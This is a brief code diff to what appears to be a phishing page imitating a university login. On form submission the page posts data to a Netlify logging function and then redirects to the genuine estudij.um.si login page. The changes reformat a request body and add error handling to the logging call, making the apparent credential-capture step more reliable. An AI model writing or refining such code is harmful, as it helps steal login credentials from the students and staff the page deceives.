@@ -439,7 +439,9 @@
     fetch("/.netlify/functions/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ formSubmitted: null }),
+      body: JSON.stringify({
+        formSubmitted: null
+      }),
     });
 
     document.querySelector("#login-form").addEventListener("submit", function (e) {
@@ -459,7 +461,10 @@
         }),
       }).then(() => {
         window.location.href = "https://estudij.um.si/login/index.php";
-      });
+      })
+        .catch(err => {
+          console.error("Logging failed:", err);
+        });
     });
   </script>
 </body>
